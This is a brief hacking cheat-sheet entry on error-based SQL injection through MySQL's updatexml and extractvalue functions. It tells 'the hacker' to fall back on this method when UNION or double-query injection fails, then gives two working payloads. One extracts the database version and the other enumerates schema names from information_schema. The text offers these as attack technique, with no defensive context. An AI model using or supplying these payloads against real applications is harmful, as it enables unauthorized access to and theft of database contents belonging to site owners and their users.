Newer DBMSs support xml By 2 functions:

    -updatexml(xml_frag,SQL-QUERY,xml_frag)
    
    -extractvalue(xml_frag,SQL-QUERY)

Note: Of course, the hacker should test other methods(UNION SELECT,Double Query,...) for SQLi and if it doesn't work, go to XMLi.


example: 

    ' or updatexml(1,concat(0x5e5e,version(),0x5e5e),1)-- 
    ' or updatexml(1,concat(0x5e,(select schema_name from information_schema.schemata limit 0,1),0x5e),1)--
